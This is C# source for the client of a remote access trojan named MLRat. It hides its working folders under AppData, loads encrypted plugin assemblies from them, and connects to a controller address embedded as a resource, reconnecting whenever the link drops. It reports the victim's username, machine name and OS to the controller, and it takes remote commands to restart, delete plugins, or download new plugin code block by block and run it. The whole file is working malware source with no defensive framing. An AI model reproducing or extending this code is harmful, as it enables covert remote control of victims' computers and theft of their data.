using MLRatClient.Networking;
using MLRat.Networking;
using MLRatClient.Plugin;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.Resources;
using System.Runtime.InteropServices;

namespace MLRatClient
{
    class Program
    {
        private static eSock.Client networkClient;
        private static Dictionary<Guid, MLClientPlugin> LoadedPlugins = new Dictionary<Guid, MLClientPlugin>();
        private static Dictionary<Guid, Stream> PluginUpdates = new Dictionary<Guid, Stream>();
        private static string PluginBaseLocation;
        private static string IP = "";
        private static int Port = 0;

        [STAThread]
        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.AssemblyResolve +=
            (sender, arg) =>
            {
                string resourceName = "MLRatClient." + new AssemblyName(arg.Name).Name + ".dll";

                using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                {
                    Byte[] assemblyData = new Byte[stream.Length];

                    stream.Read(assemblyData, 0, assemblyData.Length);

                    return Assembly.Load(assemblyData);

                }
            };
            Application.EnableVisualStyles();
            string _ratBase = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "MLRat");
            CreateHiddentDirectory(_ratBase);
            PluginBaseLocation = Path.Combine(_ratBase, "Plugins");
            CreateHiddentDirectory(PluginBaseLocation);

            DirectoryInfo di = new DirectoryInfo(PluginBaseLocation);
            foreach (FileInfo fi in di.GetFiles("*"))
            {
                LoadPlugin(fi.FullName);
            }

            Console.WriteLine("MLRat started");
            ReadSettings();
            Console.WriteLine("IP: {0}", IP);
            Console.WriteLine("Port: {0}", Port);
            Connect();
            Application.Run();
        }

        static void ReadSettings()
        {
            try
            {
                IntPtr module = GetModuleHandle(null);
                IntPtr loc = FindResource(module, "Settings", "RT_RCDATA");
                IntPtr resourceAddr = LoadResource(module, loc);
                uint size = SizeofResource(module, loc);
                byte[] resource = new byte[size];
                Marshal.Copy(resourceAddr, resource, 0, resource.Length);
                using (MemoryStream ms = new MemoryStream(resource))
                using (BinaryReader br = new BinaryReader(ms))
                {
                    Port = br.ReadInt32();
                    IP = br.ReadString();
                }
                Console.WriteLine("Loaded from settings");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Environment.Exit(0);
            }
        }
        static void Connect()
        {
            Console.WriteLine("Connecting...");
            networkClient = new eSock.Client();
            networkClient.BufferSize = 8192;
            networkClient.OnDataRetrieved += networkClient_OnDataRetrieved;
            networkClient.OnDisconnect += networkClient_OnDisconnect;
            networkClient.OnConnect += NetworkClient_OnConnect;
            networkClient.ConnectAsync(IP, Port);
        }

        private static void NetworkClient_OnConnect(eSock.Client sender, bool success)
        {
            if (success)
            {
                Console.WriteLine("Connected!");
                foreach (var plugin in LoadedPlugins)
                {
                    MLClientPlugin _plugin = plugin.Value;
                    try
                    {
                        _plugin.ClientPlugin.OnConnect();
                    }
                    catch (Exception ex)
                    {
                        DisplayException(_plugin, ex);
                    }
                }
                networkClient.Send(Guid.Empty, (byte)NetworkPacket.Handshake);
                Console.WriteLine("handshake sent");
            }
            else
            {
                Console.WriteLine("Failed to connect.");
                Thread.Sleep(5000);
                Connect();
            }
                
        }

        static void OnSend(MLConnection sender, Guid PluginID, object[] data)
        {
            try
            {
                networkClient.Send(PluginID, (object)data);
            }
            catch (Exception ex)
            {
                DisplayException(null, ex);
            }
        }

        static void DisplayException(MLClientPlugin plugin, Exception ex)
        {
            if (plugin != null)
            {
                Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.ToString());
            }
            else
            {
                Console.WriteLine(ex.ToString());
            }
        }


        static void LoadPlugin(string path)
        {
            MLClientPlugin _plugin = null;
            try
            {
                byte[] PluginBytes = null;

                using (FileStream fs = new FileStream(path, FileMode.Open))
                {
                    using (Rijndael rij = new RijndaelManaged())
                    {
                        
                        string key = Path.GetExtension(path);
                        key = key.Substring(1, key.Length - 1);
                        byte[] encryptionKey = eSock.Hashing.MD5Hash(key);
                        rij.Key = encryptionKey;
                        rij.IV = encryptionKey;
                        ICryptoTransform crypto = rij.CreateDecryptor();
                        using (MemoryStream ms = new MemoryStream())
                        {
                            byte[] buffer = new byte[1000];
                            int bytesread = 0;
                            using (CryptoStream cs = new CryptoStream(fs, crypto, CryptoStreamMode.Read))
                            {
                                while ((bytesread = cs.Read(buffer, 0, buffer.Length)) > 0)
                                {
                                    ms.Write(buffer, 0, bytesread);
                                }
                                cs.Close();
                            }
                            PluginBytes = ms.ToArray();
                        }
                    }
                }
                    /*
                    using (Rijndael rij = new RijndaelManaged())
                    {
                        byte[] encryptionKey = eSock.Hashing.MD5Hash(Path.GetExtension(path));
                        rij.Key = encryptionKey;
                        rij.IV = encryptionKey;
                        ICryptoTransform crypto = rij.CreateDecryptor();
                        byte[] encrypted = File.ReadAllBytes(path);

                        using (MemoryStream ms = new MemoryStream())
                        {
                            using (CryptoStream cs = new CryptoStream(ms, crypto, CryptoStreamMode.Write))
                            {
                                cs.Write(encrypted, 0, encrypted.Length);
                                cs.Flush();
                                cs.Close();
                            }
                            PluginBytes = ms.ToArray();
                        }

                    }
                    */

                    _plugin = new MLClientPlugin(PluginBytes);
                if (!_plugin.Load())
                    throw new Exception("Failed to load plugin");
                if (_plugin.ClientPluginID == Guid.Empty)
                    throw new Exception("Invalid plugin ID");
                if (LoadedPlugins.ContainsKey(_plugin.ClientPluginID))
                    throw new Exception("Client plugin ID match");
                _plugin.Path = path;
                LoadedPlugins.Add(_plugin.ClientPluginID, _plugin);
                Console.WriteLine("Loaded plugin: {0}", _plugin.ClientPluginID.ToString("n"));
                _plugin.ClientPlugin.OnPluginLoad(new MLConnection(_plugin.ClientPluginID, OnSend));

            }
            catch(Exception ex)
            {
                File.Delete(path);
                DisplayException(_plugin, ex);
            }
        }

        static void CreateHiddentDirectory(string path)
        {
            try
            {
                DirectoryInfo di = new DirectoryInfo(path);
                if (!di.Exists)
                {
                    di.Create();
                    di.Attributes = FileAttributes.Hidden;
                }
            }
            catch(Exception ex)
            {
                DisplayException(null, ex);
            }
        }


        static void SendChecksums()
        {
            try
            {
                Dictionary<Guid, string> Checksums = new Dictionary<Guid, string>();
                foreach (var plugin in LoadedPlugins)
                {
                    Checksums.Add(plugin.Value.ClientPluginID, plugin.Value.Checksum);
                }
                Console.WriteLine("Sent checksums");
                networkClient.Send(Guid.Empty, (byte)NetworkPacket.Checksums, Checksums);
            }
            catch(Exception ex)
            {
                DisplayException(null, ex);
            }

        }

        #region " Network callbacks "

        static void networkClient_OnDisconnect(eSock.Client sender, System.Net.Sockets.SocketError ER)
        {
            foreach (var plugin in LoadedPlugins)
            {
                MLClientPlugin _plugin = plugin.Value;
                try
                {
                    _plugin.ClientPlugin.OnDisconnect();
                }
                catch(Exception ex)
                {
                    DisplayException(_plugin, ex);
                }
            }
            Console.WriteLine("Lost connection...");
            Thread.Sleep(5000);
            Connect();
        }

        static void networkClient_OnDataRetrieved(eSock.Client sender, object[] data)
        {
            try
            {
                Guid ID = (Guid)data[0];
                if (ID == Guid.Empty)
                {
                    var command = (NetworkPacket) data[1];
                    if (command == (byte)NetworkPacket.Restart)
                    {
                        Console.WriteLine("Restarting...");
                        //Console.ReadLine();
                        Process.Start(Assembly.GetExecutingAssembly().Location);
                        Environment.Exit(0);
                    }

                    if (command == NetworkPacket.DeletePlugin)
                    {
                        Guid PluginID = (Guid)data[2];
                        if(LoadedPlugins.ContainsKey(PluginID))
                        {
                            Console.WriteLine("Deleting plugin {0}", PluginID.ToString("n"));
                            File.Delete(LoadedPlugins[PluginID].Path);
                        }
                        
                    }

                    if (command == NetworkPacket.UpdatePlugin)
                    {
                        Guid PluginID = (Guid) data[2];
                        byte[] Block = (byte[]) data[3];
                        bool FinalBlock = (bool) data[4];

                        if (!PluginUpdates.ContainsKey(PluginID))
                        {
                            Rijndael rij = new RijndaelManaged();
                            string encString = Guid.NewGuid().ToString("n");
                            byte[] encryptionKey = eSock.Hashing.MD5Hash(encString);
                            rij.Key = encryptionKey;
                            rij.IV = encryptionKey;
                            ICryptoTransform crypto = rij.CreateEncryptor();

                            FileStream update =
                                new FileStream(
                                    Path.Combine(PluginBaseLocation,
                                        string.Format("{0}.{1}", PluginID.ToString("n"), encString)), FileMode.Create);
                            CryptoStream updateStream = new CryptoStream(update, crypto, CryptoStreamMode.Write);
                            PluginUpdates[PluginID] = updateStream;
                            Console.WriteLine("Started update for plugin id {0}", PluginID.ToString("n"));
                            if (LoadedPlugins.ContainsKey(PluginID))
                            {
                                File.Delete(LoadedPlugins[PluginID].Path);
                            }
                        }
                        Console.WriteLine("Plugin block ({0} bytes) recieved. ID: {1}", Block.Length, PluginID.ToString("n"));
                        PluginUpdates[PluginID].Write(Block, 0, Block.Length);
                        if (FinalBlock)
                        {
                            PluginUpdates[PluginID].Flush();
                            PluginUpdates[PluginID].Close();
                            PluginUpdates[PluginID].Dispose();
                            PluginUpdates.Remove(PluginID);
                            Console.WriteLine("Finished update for plugin id {0}", PluginID.ToString("n"));
                        }
                    }

                    if(command == NetworkPacket.PluginsVerified)
                    {
                        /*
                        Dictionary<string, object> Settings = new Dictionary<string, object>()
                        {
                            {"Username", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName)},
                            {"OS", Environment.OSVersion.ToString() },
                            {"Cores", Environment.ProcessorCount.ToString() },
                            {"Path", Assembly.GetExecutingAssembly().Location }
                        };
                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.UpdateSettingsDictionary, Settings);
                        networkClient.SendWait(Guid.Empty, (byte)NetworkPacket.BasicSettingsUpdated);
                        */
                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Username", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName));
                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "OS", Environment.OSVersion.ToString());
                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.UpdateSetting, "Cores", Environment.ProcessorCount.ToString());
                        networkClient.Send(Guid.Empty, (byte)NetworkPacket.BasicSettingsUpdated);
                    }


                    if (command == NetworkPacket.Connect)
                    {
                        networkClient.Encryption.Key = (string)data[2];
                        networkClient.Encryption.Enabled = true;
                        Console.WriteLine("Encryption Enabled: {0}", networkClient.Encryption.Enabled);
                        Console.WriteLine("Encryption key set ({0})", networkClient.Encryption.Key);

                        SendChecksums();
                    }
                }

                if (LoadedPlugins.ContainsKey(ID))
                {
                    try
                    {
                        LoadedPlugins[ID].ClientPlugin.OnDataRecieved((object[])data[1]);
                    }
                    catch(Exception ex)
                    {
                        DisplayException(LoadedPlugins[ID], ex);
                    }
                }
            }
            catch(Exception ex)
            {
                DisplayException(null, ex);
            }
        }


        #endregion

        #region " WinApi "

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string module);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FindResource(IntPtr hModule, string lpName, string lpType);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

        #endregion

    }
}
